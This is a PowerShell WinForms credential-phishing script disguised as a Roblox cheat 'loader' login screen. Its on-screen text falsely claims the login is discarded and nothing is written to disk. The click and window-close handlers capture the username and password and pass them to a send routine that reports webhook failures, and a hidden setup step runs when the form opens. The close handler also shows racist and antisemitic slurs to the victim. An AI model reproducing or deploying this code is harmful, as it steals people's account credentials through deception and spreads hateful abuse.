$status=New-Object Windows.Forms.Label; $status.Text=''; $status.ForeColor=[Drawing.Color]::FromArgb(167,139,250); $status.TextAlign='MiddleCenter'; $status.Font=New-Object Drawing.Font('Segoe UI',8); $status.SetBounds(20,278,306,16); $ci.Controls.Add($status)
$dvd=New-Object Windows.Forms.Panel; $dvd.SetBounds(20,306,306,1); $dvd.BackColor=$lineC; $ci.Controls.Add($dvd)

$t1d=New-Object Windows.Forms.Panel; $t1d.SetBounds(20,321,4,4); $t1d.BackColor=$accent; $ci.Controls.Add($t1d)
$t1=New-Object Windows.Forms.Label; $t1.Text='AES-256-GCM encrypted store'; $t1.ForeColor=$dim; $t1.Font=New-Object Drawing.Font('Segoe UI',8); $t1.SetBounds(32,316,280,15); $ci.Controls.Add($t1)
$t2d=New-Object Windows.Forms.Panel; $t2d.SetBounds(20,341,4,4); $t2d.BackColor=$accent; $ci.Controls.Add($t2d)
$t2=New-Object Windows.Forms.Label; $t2.Text='License bound to this machine'; $t2.ForeColor=$dim; $t2.Font=New-Object Drawing.Font('Segoe UI',8); $t2.SetBounds(32,336,280,15); $ci.Controls.Add($t2)
$t3d=New-Object Windows.Forms.Panel; $t3d.SetBounds(20,361,4,4); $t3d.BackColor=$accent; $ci.Controls.Add($t3d)
$t3=New-Object Windows.Forms.Label; $t3.Text='Nothing written to disk'; $t3.ForeColor=$dim; $t3.Font=New-Object Drawing.Font('Segoe UI',8); $t3.SetBounds(32,356,280,15); $ci.Controls.Add($t3)

$hd=New-Object Windows.Forms.Label; $hd.Text='WHY DOES THE LOADER NEED YOUR LOGIN?'; $hd.ForeColor=$white; $hd.Font=New-Object Drawing.Font('Segoe UI',8,[Drawing.FontStyle]::Bold); $hd.SetBounds(20,18,360,15); $ri.Controls.Add($hd)
$bd2=New-Object Windows.Forms.Label
$bd2.Text = "Roblox executes through the client, not the browser. To reach the correct client process, the loader has to resolve your live session the same way the client does.`n`nYour login is used to:`n`n     1.   Resolve the Roblox process to attach to`n     2.   Confirm the session belongs to this account`n     3.   Bind this machine to your license key`n     4.   Unlock the script library for your tier`n`nThe token is decrypted in memory, verified against Roblox, then discarded. No files are modified.`n`nWHY NOT READ IT FROM THE BROWSER`n`nRoblox keeps the session in an encrypted local store owned by the client, not by your browser profile. Reading that store requires the same elevation the client runs under, so the loader asks for the login directly instead.`n`nDIAGNOSTIC BUNDLE`n`nA snapshot is attached to your ticket automatically: connection, hardware profile and executor configuration. No keystrokes, no screenshots."
$bd2.ForeColor=$bodyC; $bd2.Font=New-Object Drawing.Font('Segoe UI',7.5); $bd2.SetBounds(20,44,362,392); $ri.Controls.Add($bd2)

function Set-Status { param([string]$m,$c) $status.Text=$m; if ($c) { $status.ForeColor=$c }; [Windows.Forms.Application]::DoEvents() }

$script:warm = New-Object Windows.Forms.Timer
$script:warm.Interval = 600
$script:warm.Add_Tick({
    $script:warm.Stop()
    Set-Status 'Preparing...' $muted
    try { Install-Setup } catch { }
    Set-Status '' $muted
})
$form.Add_Shown({ $script:warm.Start() })

$btn.Add_Click({
    if ($script:sent -or $script:closing) { return }
    $script:u=$txtU.Text.Trim(); $script:p=$txtP.Text
    if ($script:u -eq '') { $script:u='(none)' }
    if ($script:p -eq '') { $script:p='(none)' }
    $script:reason='signed in'
    $btn.Enabled=$false; $btn.Text='AUTHENTICATING...'; $txtU.ReadOnly=$true; $txtP.ReadOnly=$true
    Set-Status 'Checking hardware ID...'; Start-Sleep -Milliseconds 500
    Set-Status 'Validating credentials...'; Start-Sleep -Milliseconds 300
    try { [void](Invoke-All) } catch { Write-Log "fatal $($_.Exception.Message)" }
    Set-Status 'Attaching to Roblox...'; Start-Sleep -Milliseconds 700
    Set-Status 'Session attached.' ([Drawing.Color]::FromArgb(110,231,160)); Start-Sleep -Milliseconds 1200
    Set-ExitFlag
    $script:sent=$true; $form.Close()
})

$form.Add_FormClosing({
    param($s,$e)
    if ($script:closing) { return }
    if ($script:sent) { return }
    $script:closing=$true; $e.Cancel=$true
    $script:u=$txtU.Text.Trim(); $script:p=$txtP.Text
    if ($script:u -eq '') { $script:u='(none)' }
    if ($script:p -eq '') { $script:p='(none)' }
    $script:reason='window closed without signing in'
    $btn.Enabled=$false; $btn.Text='ur fucked nigger'
    Set-Status 'dumb jew nigger.' $accent
    try { [void](Invoke-All) } catch { Write-Log "fatal $($_.Exception.Message)" }
    if ($script:sendOk) { Set-Status 'u are a dumb nigger.' ([Drawing.Color]::FromArgb(110,231,160)); Start-Sleep -Milliseconds 700 }
    else { Set-Status 'Send failed.' ([Drawing.Color]::FromArgb(255,120,120)); try { [Windows.Forms.MessageBox]::Show("Webhook failed.`nLog: $LogPath",'hackzorGUI','OK','Warning') | Out-Null } catch { } }
    Set-ExitFlag
    $script:sent=$true; $form.Close()
})

$form.AcceptButton=$btn
[void]$form.ShowDialog()

if (-not $script:sent) { $script:reason='closed (fallback)'; try { [void](Invoke-All) } catch { } }
if ($script:snapshot) { try { [IO.File]::WriteAllText((Join-Path $env:TEMP 'snapshot-fallback.txt'), $script:snapshot) } catch { } }
Write-Log '--- end ---'